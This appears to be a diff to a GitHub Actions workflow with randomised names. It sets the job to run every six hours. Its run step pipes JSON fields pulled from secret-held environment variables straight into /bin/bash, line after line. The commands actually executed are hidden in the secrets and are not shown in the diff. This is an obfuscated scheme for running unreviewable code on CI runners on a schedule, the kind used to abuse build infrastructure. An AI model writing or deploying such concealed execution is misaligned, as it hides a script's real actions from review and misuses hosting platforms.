@@ -1,8 +1,9 @@
 name: zhoudapeng9813
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 0/6 * * *'
+    - cron: '3 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,19 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhoudapeng9813
         env:
-          vyd9: ${{ secrets.vyd9 }}
+          cj73226: ${{ secrets.cj73226 }}
         run: |
-          echo $vyd9 | jq -r .ci7 | /bin/bash
-          echo $t9142 | jq -r .skv770 | /bin/bash
-          echo $ci75 | jq -r .m59247 | /bin/bash
-          echo $aezb340 | jq -r .bf401 | /bin/bash
-          echo $s65427 | jq -r .rieli09 | /bin/bash
-          echo $ijmlx2 | jq -r .ajve2 | /bin/bash
-          echo $fdd34184 | jq -r .p16 | /bin/bash
-          echo $o27999 | jq -r .n2 | /bin/bash
-          echo $ej51782 | jq -r .dd27565 | /bin/bash
-          echo $i0946 | jq -r .a701 | /bin/bash
-          echo $vz69404 | jq -r .eck24 | /bin/bash
-          echo $qb6560 | jq -r .ub69 | /bin/bash
-          echo $duhq99 | jq -r .e6 | /bin/bash
+          echo $cj73226 | jq -r .nevd6156 | /bin/bash
+          echo $sdyf63518 | jq -r .tcy5394 | /bin/bash
+          echo $aogg7 | jq -r .jcc38154 | /bin/bash
+          echo $qpf79 | jq -r .dc822 | /bin/bash
+          echo $dtf1 | jq -r .rcnpe06 | /bin/bash
+          echo $vryoj89167 | jq -r .kgx8443 | /bin/bash
+          echo $ohly7266 | jq -r .outgp936 | /bin/bash
+          echo $ys4935 | jq -r .v3 | /bin/bash
+          echo $pch50345 | jq -r .w68394 | /bin/bash
 
